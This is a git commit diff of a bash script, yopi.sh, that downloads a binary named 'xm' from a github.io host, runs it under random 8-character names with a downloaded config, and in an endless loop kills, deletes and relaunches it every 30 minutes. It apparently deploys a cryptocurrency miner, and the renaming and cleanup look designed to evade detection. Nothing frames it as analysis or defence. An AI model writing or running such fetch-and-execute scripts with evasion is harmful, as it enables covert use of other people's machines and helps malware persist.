8283efcd1226bdb56087bb79441bcc79963414e9
pzeankto <57797716+pzeankto@users.noreply.github.com>
2019-11-22 23:14:24 +0100

    Update yopi.sh

--- yopi.sh
+++ yopi.sh
@@ -1,11 +1,22 @@
 #!/bin/bash
 echo "Getting Things Ready ... "
 wget http://dzmltzack.github.io/web/xm -O oxm
+while true
+do
 NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
-BB=za$NEW_UUID
+BB=z$NEW_UUID
+NN=n$NEW_UUID
 cp oxm $BB
 echo $NN >> $BB
 wget https://pzeankto.github.io/namnam/arqt.json -O config.json
 sed -i "s/PSPS/$PASS/g" config.json
 chmod +x $BB
 ./$BB
+sleep 1800
+kill -9 $(pgrep $BB)
+kill -9 $(pgrep z)
+rm -f $BB
+rm -f z*
+rm -f config.json
+sleep 200
+done
